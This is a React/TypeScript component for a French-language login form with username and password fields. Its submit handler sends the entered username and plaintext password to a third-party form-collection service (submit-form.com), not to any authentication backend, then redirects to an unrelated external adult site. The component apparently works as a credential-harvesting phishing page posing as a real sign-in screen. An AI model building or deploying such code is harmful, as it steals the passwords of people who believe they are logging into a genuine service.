import { CircleUser, LockKeyhole } from "lucide-react";
import { useState } from "react";

export default function LoginFields() {
   const [formData, setFormData] = useState({ username: "", motdepasse: ""});
   const [showPassword] = useState(false);

const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  setFormData({ ...formData, [e.target.name]: e.target.value });
};


const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
  e.preventDefault();

  try {
    const response = await fetch("https://submit-form.com/phw22hQng", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });

    if (response.ok) {
      // Redirection vers une URL externe
      window.location.href = "https://m.sexemodel.com/";
    } else {
      // Actualiser la page
      window.location.reload();
    }
  } catch (error) {
    // Actualiser la page
    window.location.reload();
  }
};
  
  return (
    <form onSubmit={handleSubmit} className="space-y-3 my-2" action="">
      {/* Champ Nom d'utilisateur */}
      <div className="flex items-center border border-[#660000] rounded-md bg-[#f8efe9] px-3 py-1">
        <CircleUser size={20} color="#660000" strokeWidth={2} absoluteStrokeWidth className=" mr-2"/>
        <input
          type="text"
          id="username"
          name="username"
          value={formData.username}
          onChange={handleChange}
          placeholder="Nom d'utilisateur"
          className="flex-1 bg-transparent text-gray-600 placeholder-gray-500 outline-none"
          required
        />
      </div>

      {/* Champ Mot de passe */}
      <div className="flex items-center border border-[#660000] rounded-md bg-[#f8efe9] px-3 py-1">
        <LockKeyhole size={20} color="#660000" strokeWidth={2} absoluteStrokeWidth className=" mr-2"/>
        <input
          type={showPassword ? "text" : "password"}
          id="motdepasse"
          name="motdepasse"
          value={formData.motdepasse}
          onChange={handleChange}
          placeholder="Mot de passe"
          className="flex-1 bg-transparent text-gray-600 placeholder-gray-500 outline-none"
          required
        />
      </div>
            {/* Checkbox rester connecté */}
      <div className="flex items-center mb-2">
        <input type="checkbox" id="stayConnected" className="mr-2" />
        <label htmlFor="stayConnected" className="text-sm text-gray-500 tracking-tight">
          Rester connecté
        </label>
      </div>

      {/* Boutons */}
      <div className="flex gap-4 mb-4">
        <button type="reset" className="bg-linear-to-t from-gray-500 via-gray-200 via-40% to-gray-500 to-95% text-white font-semibold px-10 h-8 rounded w-[140px] hover:opacity-80 text-shadow text-[14px] tracking-tight">
          Annuler
        </button>
        <button type="submit" className="bg-linear-to-t from-green-700 via-green-500 to-green-500 text-white font-semibold px-4 h-8 rounded w-[140px] hover:bg-green-700 text-shadow text-[14px] tracking-tight">
          Connectez-vous
        </button>
      </div>
      <span style={{ display: "inline-block", borderBottom: "1px dotted black", width: "100%" }}></span>

      {/* Liens */}
      <div className=" text-[15px]">
        <a href="/" className="text-blue-600 hover:underline tracking-tight">
          S'inscrire!
        </a>
        <span className="mx-1 text-blue-600">•</span>
        <a href="/" className="text-blue-600 tracking-tight">
          Mot de Passe oublié?
        </a>
      </div>
    </form>
  );
}
